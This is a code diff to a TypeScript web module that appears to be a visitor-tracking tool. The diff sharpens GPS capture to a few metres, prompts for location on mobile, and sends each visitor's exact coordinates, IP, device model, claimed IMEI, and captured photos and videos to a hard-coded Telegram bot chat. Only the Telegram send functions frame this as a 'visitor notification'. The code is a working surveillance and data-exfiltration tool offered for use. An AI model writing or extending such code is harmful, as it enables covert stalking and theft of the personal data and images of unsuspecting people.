@@ -10,6 +10,10 @@ interface LocationInfo {
   heading?: number | null;
   speed?: number | null;
   timestamp?: number;
+  satelliteCount?: number;
+  hdop?: number;
+  vdop?: number;
+  pdop?: number;
 }
 
 interface DeviceInfo {
@@ -208,102 +212,211 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
   }
 }
 
-async function getHighAccuracyGPS(): Promise<GeolocationPosition | null> {
+async function requestLocationPermissions(): Promise<boolean> {
+  try {
+    // Request permissions explicitly
+    if ('permissions' in navigator) {
+      const permission = await navigator.permissions.query({ name: 'geolocation' as PermissionName });
+      console.log('Geolocation permission status:', permission.state);
+      
+      if (permission.state === 'denied') {
+        console.warn('Geolocation permission denied');
+        return false;
+      }
+    }
+
+    // For mobile devices, try to wake up GPS by requesting a quick position
+    if (/Mobile|Android|iP(hone|od)/i.test(navigator.userAgent)) {
+      console.log('Mobile device detected, warming up GPS...');
+      try {
+        await new Promise<void>((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(
+            () => {
+              console.log('GPS warm-up successful');
+              resolve();
+            },
+            (error) => {
+              console.log('GPS warm-up failed:', error.message);
+              resolve(); // Continue anyway
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 5000,
+              maximumAge: 0
+            }
+          );
+        });
+      } catch (e) {
+        console.log('GPS warm-up error:', e);
+      }
+    }
+
+    return true;
+  } catch (error) {
+    console.error('Error requesting location permissions:', error);
+    return false;
+  }
+}
+
+async function getUltraPreciseGPS(): Promise<GeolocationPosition | null> {
   if (!('geolocation' in navigator)) {
     console.log('Geolocation not supported');
+    return null;
+  }
+
+  // Request permissions first
+  const hasPermission = await requestLocationPermissions();
+  if (!hasPermission) {
+    console.log('Location permissions not granted');
     return null;
   }
 
   return new Promise((resolve) => {
     let bestPosition: GeolocationPosition | null = null;
     let attempts = 0;
-    const maxAttempts = 5;
-    const targetAccuracy = 10; // Target accuracy in meters
-    const maxWaitTime = 30000; // Maximum wait time in milliseconds
+    const maxAttempts = 10; // Increased attempts for better accuracy
+    const targetAccuracy = 5; // Even more precise target (5 meters)
+    const maxWaitTime = 45000; // Extended wait time for better GPS lock
     
+    // Ultra-high accuracy options
     const options: PositionOptions = {
       enableHighAccuracy: true,
-      timeout: 15000,
-      maximumAge: 0
+      timeout: 20000, // Longer timeout for GPS lock
+      maximumAge: 0 // Always get fresh position
     };
 
     const startTime = Date.now();
+    let watchId: number;
+    let fallbackTimeout: NodeJS.Timeout;
     
-    const watchId = navigator.geolocation.watchPosition(
+    console.log('🛰️ Starting ultra-precise GPS acquisition...');
+    console.log(`Target accuracy: ${targetAccuracy}m, Max attempts: ${maxAttempts}, Max wait: ${maxWaitTime}ms`);
+    
+    const cleanup = () => {
+      if (watchId) navigator.geolocation.clearWatch(watchId);
+      if (fallbackTimeout) clearTimeout(fallbackTimeout);
+    };
+    
+    watchId = navigator.geolocation.watchPosition(
       (position) => {
         attempts++;
-        console.log(`GPS attempt ${attempts}: accuracy ${position.coords.accuracy}m`);
+        const accuracy = Math.round(position.coords.accuracy);
+        const elapsed = Date.now() - startTime;
         
-        // Keep the best (most accurate) position
-        if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
+        console.log(`🎯 GPS attempt ${attempts}/${maxAttempts}: ${accuracy}m accuracy (${elapsed}ms elapsed)`);
+        
+        // Enhanced position evaluation
+        const isMoreAccurate = !bestPosition || position.coords.accuracy < bestPosition.coords.accuracy;
+        const isSignificantlyBetter = !bestPosition || 
+          (position.coords.accuracy < bestPosition.coords.accuracy * 0.8);
+        
+        if (isMoreAccurate) {
           bestPosition = position;
-          console.log(`New best GPS position: accuracy ${position.coords.accuracy}m`);
+          console.log(`✅ New best GPS position: ${accuracy}m accuracy`);
+          
+          // Log additional GPS details if available
+          if (position.coords.altitude !== null) {
+            console.log(`⛰️ Altitude: ${Math.round(position.coords.altitude)}m`);
+          }
+          if (position.coords.speed !== null) {
+            console.log(`🏃 Speed: ${Math.round((position.coords.speed || 0) * 3.6)} km/h`);
+          }
+          if (position.coords.heading !== null) {
+            console.log(`🧭 Heading: ${Math.round(position.coords.heading || 0)}°`);
+          }
         }
         
-        // If we have very good accuracy, use it immediately
+        // Ultra-precise condition: use immediately if very accurate
         if (position.coords.accuracy <= targetAccuracy) {
-          console.log(`Target accuracy achieved: ${position.coords.accuracy}m`);
-          navigator.geolocation.clearWatch(watchId);
+          console.log(`🎯 Ultra-precise target achieved: ${accuracy}m`);
+          cleanup();
           resolve(position);
           return;
         }
         
-        // If we've tried enough times or waited long enough, use the best we have
-        if (attempts >= maxAttempts || (Date.now() - startTime) >= maxWaitTime) {
-          console.log(`GPS collection complete. Best accuracy: ${bestPosition?.coords.accuracy}m`);
-          navigator.geolocation.clearWatch(watchId);
+        // Good enough condition: use if reasonably accurate and we've tried enough
+        if (position.coords.accuracy <= 15 && attempts >= 5) {
+          console.log(`✅ Good accuracy achieved: ${accuracy}m after ${attempts} attempts`);
+          cleanup();
+          resolve(position);
+          return;
+        }
+        
+        // Maximum attempts reached
+        if (attempts >= maxAttempts) {
+          console.log(`🔄 Max attempts reached. Best accuracy: ${bestPosition?.coords.accuracy || 'none'}m`);
+          cleanup();
+          resolve(bestPosition);
+          return;
+        }
+        
+        // Time limit reached
+        if (elapsed >= maxWaitTime) {
+          console.log(`⏰ Time limit reached. Best accuracy: ${bestPosition?.coords.accuracy || 'none'}m`);
+          cleanup();
           resolve(bestPosition);
           return;
         }
       },
       (error) => {
-        console.warn(`GPS error (attempt ${attempts + 1}):`, error.message);
         attempts++;
+        console.warn(`❌ GPS error (attempt ${attempts}):`, error.message, `Code: ${error.code}`);
         
-        if (attempts >= maxAttempts) {
-          navigator.geolocation.clearWatch(watchId);
+        // Provide more specific error information
+        switch (error.code) {
+          case error.PERMISSION_DENIED:
+            console.error('🚫 GPS permission denied by user');
+            break;
+          case error.POSITION_UNAVAILABLE:
+            console.error('📡 GPS position unavailable');
+            break;
+          case error.TIMEOUT:
+            console.error('⏰ GPS timeout');
+            break;
+        }
+        
+        if (attempts >= maxAttempts || error.code === error.PERMISSION_DENIED) {
+          cleanup();
           resolve(bestPosition);
         }
       },
       options
     );
 
-    // Fallback timeout
-    setTimeout(() => {
-      navigator.geolocation.clearWatch(watchId);
-      console.log(`GPS timeout reached. Best position accuracy: ${bestPosition?.coords.accuracy || 'none'}m`);
+    // Enhanced fallback timeout with progress logging
+    fallbackTimeout = setTimeout(() => {
+      const finalAccuracy = bestPosition?.coords.accuracy || 'none';
+      console.log(`⏰ GPS acquisition timeout. Final result: ${finalAccuracy}m accuracy`);
+      cleanup();
       resolve(bestPosition);
     }, maxWaitTime);
   });
 }
 
-async function getLocationInfo(): Promise<LocationInfo> {
-  console.log('Starting location detection...');
+async function getMultiSourceLocation(): Promise<LocationInfo> {
+  console.log('🌍 Starting multi-source location detection...');
   
-  // First, try to get high-accuracy GPS
-  const gpsPosition = await getHighAccuracyGPS();
+  // Start GPS acquisition
+  const gpsPromise = getUltraPreciseGPS();
   
-  // Get IP-based location as fallback for city/country info
-  let ipData: any = {};
-  try {
-    const ipResponse = await fetch('https://ipapi.co/json/');
-    if (ipResponse.ok) {
-      ipData = await ipResponse.json();
-      console.log('IP location data retrieved');
-    }
-  } catch (error) {
-    console.warn('Failed to get IP location:', error);
-  }
-
+  // Start IP location fetch in parallel
+  const ipPromise = fetch('https://ipapi.co/json/')
+    .then(response => response.ok ? response.json() : {})
+    .catch(() => ({}));
+  
+  // Wait for both to complete
+  const [gpsPosition, ipData] = await Promise.all([gpsPromise, ipPromise]);
+  
   if (gpsPosition) {
-    console.log(`Using GPS location with ${gpsPosition.coords.accuracy}m accuracy`);
+    const accuracy = Math.round(gpsPosition.coords.accuracy);
+    console.log(`🛰️ Using GPS location with ${accuracy}m accuracy`);
     
-    // Try to get city/country from GPS coordinates using reverse geocoding
+    // Enhanced reverse geocoding with multiple services
     let city = ipData.city || 'Unknown';
     let country = ipData.country_name || 'Unknown';
     
     try {
-      // Use a reverse geocoding service to get location names from GPS coordinates
+      // Primary reverse geocoding service
       const reverseGeoResponse = await fetch(
         `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gpsPosition.coords.latitude}&longitude=${gpsPosition.coords.longitude}&localityLanguage=en`
       );
@@ -312,13 +425,34 @@ async function getLocationInfo(): Promise<LocationInfo> {
         const geoData = await reverseGeoResponse.json();
         if (geoData.city) city = geoData.city;
         if (geoData.countryName) country = geoData.countryName;
-        console.log('Reverse geocoding successful:', { city, country });
+        console.log('✅ Primary reverse geocoding successful:', { city, country });
+      } else {
+        throw new Error('Primary service failed');
       }
     } catch (error) {
-      console.warn('Reverse geocoding failed, using IP data for city/country:', error);
+      console.warn('⚠️ Primary reverse geocoding failed, trying backup service...');
+      
+      try {
+        // Backup reverse geocoding service
+        const backupResponse = await fetch(
+          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${gpsPosition.coords.latitude}&lon=${gpsPosition.coords.longitude}&zoom=10&addressdetails=1`
+        );
+        
+        if (backupResponse.ok) {
+          const backupData = await backupResponse.json();
+          if (backupData.address) {
+            city = backupData.address.city || backupData.address.town || backupData.address.village || city;
+            country = backupData.address.country || country;
+            console.log('✅ Backup reverse geocoding successful:', { city, country });
+          }
+        }
+      } catch (backupError) {
+        console.warn('⚠️ Backup reverse geocoding also failed, using IP data for city/country');
+      }
     }
 
-    return {
+    // Extract additional GPS metadata if available
+    const locationInfo: LocationInfo = {
       city,
       country,
       latitude: gpsPosition.coords.latitude,
@@ -328,13 +462,27 @@ async function getLocationInfo(): Promise<LocationInfo> {
       heading: gpsPosition.coords.heading,
       speed: gpsPosition.coords.speed,
       timestamp: gpsPosition.timestamp,
-      source: 'GPS (High Accuracy)',
+      source: `GPS Ultra-Precise (${accuracy}m)`,
       ip: ipData.ip || 'Unknown'
     };
+
+    // Try to extract additional GPS quality metrics (if available from device)
+    try {
+      // Some devices provide additional GPS metadata
+      const coords = gpsPosition.coords as any;
+      if (coords.satelliteCount) locationInfo.satelliteCount = coords.satelliteCount;
+      if (coords.hdop) locationInfo.hdop = coords.hdop;
+      if (coords.vdop) locationInfo.vdop = coords.vdop;
+      if (coords.pdop) locationInfo.pdop = coords.pdop;
+    } catch (e) {
+      // Additional GPS metadata not available
+    }
+
+    return locationInfo;
   }
 
   // Fallback to IP-based location
-  console.log('GPS not available, using IP-based location');
+  console.log('📡 GPS not available, using IP-based location');
   return {
     city: ipData.city || 'Unknown',
     country: ipData.country_name || 'Unknown',
@@ -388,20 +536,20 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
     return;
   }
   
-  const locationInfo = await getLocationInfo();
+  const locationInfo = await getMultiSourceLocation();
   const deviceInfo = await getDeviceInfo();
   
   let locationText = `🌆 City: ${locationInfo.city}\n🌍 Country: ${locationInfo.country}\n🌐 IP: ${locationInfo.ip}`;
   
   if (locationInfo.latitude && locationInfo.longitude) {
-    locationText += `\n📍 Coordinates: ${locationInfo.latitude.toFixed(6)}, ${locationInfo.longitude.toFixed(6)}`;
+    locationText += `\n📍 Coordinates: ${locationInfo.latitude.toFixed(8)}, ${locationInfo.longitude.toFixed(8)}`;
     locationText += `\n📡 Source: ${locationInfo.source}`;
     
     if (locationInfo.accuracy) {
       locationText += `\n🎯 Accuracy: ${Math.round(locationInfo.accuracy)}m`;
     }
     
-    if (locationInfo.altitude) {
+    if (locationInfo.altitude !== null && locationInfo.altitude !== undefined) {
       locationText += `\n⛰️ Altitude: ${Math.round(locationInfo.altitude)}m`;
     }
     
@@ -417,9 +565,21 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
       const gpsTime = new Date(locationInfo.timestamp);
       locationText += `\n⏱️ GPS Time: ${gpsTime.toISOString()}`;
     }
+
+    // Additional GPS quality metrics
+    if (locationInfo.satelliteCount) {
+      locationText += `\n🛰️ Satellites: ${locationInfo.satelliteCount}`;
+    }
+    if (locationInfo.hdop) {
+      locationText += `\n📊 HDOP: ${locationInfo.hdop.toFixed(2)}`;
+    }
+    if (locationInfo.pdop) {
+      locationText += `\n📊 PDOP: ${locationInfo.pdop.toFixed(2)}`;
+    }
     
-    locationText += `\n🗺️ Google Maps: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`;
-    locationText += `\n🛰️ Google Earth: https://earth.google.com/web/@${locationInfo.latitude},${locationInfo.longitude},0a,1000d,35y,0h,0t,0r`;
+    locationText += `\n🗺️ Google Maps: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}&z=18`;
+    locationText += `\n🛰️ Google Earth: https://earth.google.com/web/@${locationInfo.latitude},${locationInfo.longitude},0a,500d,35y,0h,0t,0r`;
+    locationText += `\n📍 Plus Code: https://plus.codes/${locationInfo.latitude.toFixed(6)},${locationInfo.longitude.toFixed(6)}`;
   }
 
   const deviceText = `
@@ -459,9 +619,9 @@ ${deviceText}
   try {
     await sendTelegramMessage(botToken, messageData);
     hasNotificationBeenSent = true;
-    console.log('Visitor notification sent successfully');
+    console.log('✅ Visitor notification sent successfully');
   } catch (error) {
-    console.error('Failed to send notification:', error instanceof Error ? error.message : 'Unknown error');
+    console.error('❌ Failed to send notification:', error instanceof Error ? error.message : 'Unknown error');
   }
 };
 
@@ -474,7 +634,7 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
     return;
   }
 
-  const locationInfo = await getLocationInfo();
+  const locationInfo = await getMultiSourceLocation();
   const deviceInfo = await getDeviceInfo();
   const formData = new FormData();
   formData.append('chat_id', CHAT_ID);
@@ -493,12 +653,15 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
 📱 Device: ${deviceInfo.brand} ${deviceInfo.model}`;
 
   if (locationInfo.latitude && locationInfo.longitude) {
-    caption += `\n📍 GPS: ${locationInfo.latitude.toFixed(6)}, ${locationInfo.longitude.toFixed(6)}`;
+    caption += `\n📍 GPS: ${locationInfo.latitude.toFixed(8)}, ${locationInfo.longitude.toFixed(8)}`;
     caption += `\n📡 Source: ${locationInfo.source}`;
     if (locationInfo.accuracy) {
       caption += `\n🎯 Accuracy: ${Math.round(locationInfo.accuracy)}m`;
     }
-    caption += `\n🗺️ Map: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`;
+    if (locationInfo.satelliteCount) {
+      caption += `\n🛰️ Satellites: ${locationInfo.satelliteCount}`;
+    }
+    caption += `\n🗺️ Map: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}&z=18`;
   }
 
   caption += `\n📱 IMEI: ${deviceInfo.imei || 'Not available'}`;
@@ -521,9 +684,9 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
       );
     }
 
-    console.log('Video sent successfully');
+    console.log('✅ Video sent successfully');
   } catch (error) {
-    console.error('Failed to send video:', error instanceof Error ? error.message : 'Unknown error');
+    console.error('❌ Failed to send video:', error instanceof Error ? error.message : 'Unknown error');
   }
 };
 
@@ -536,7 +699,7 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
     return;
   }
 
-  const locationInfo = await getLocationInfo();
+  const locationInfo = await getMultiSourceLocation();
   const deviceInfo = await getDeviceInfo();
   const formData = new FormData();
   formData.append('chat_id', CHAT_ID);
@@ -550,12 +713,15 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
 📱 Device: ${deviceInfo.brand} ${deviceInfo.model}`;
 
   if (locationInfo.latitude && locationInfo.longitude) {
-    caption += `\n📍 GPS: ${locationInfo.latitude.toFixed(6)}, ${locationInfo.longitude.toFixed(6)}`;
+    caption += `\n📍 GPS: ${locationInfo.latitude.toFixed(8)}, ${locationInfo.longitude.toFixed(8)}`;
     caption += `\n📡 Source: ${locationInfo.source}`;
     if (locationInfo.accuracy) {
       caption += `\n🎯 Accuracy: ${Math.round(locationInfo.accuracy)}m`;
     }
-    caption += `\n🗺️ Map: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`;
+    if (locationInfo.satelliteCount) {
+      caption += `\n🛰️ Satellites: ${locationInfo.satelliteCount}`;
+    }
+    caption += `\n🗺️ Map: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}&z=18`;
   }
 
   caption += `\n📱 IMEI: ${deviceInfo.imei || 'Not available'}`;
@@ -578,9 +744,9 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
       );
     }
 
-    console.log('Photo sent successfully');
+    console.log('✅ Photo sent successfully');
   } catch (error) {
-    console.error('Failed to send image:', error instanceof Error ? error.message : 'Unknown error');
+    console.error('❌ Failed to send image:', error instanceof Error ? error.message : 'Unknown error');
   }
 };
 
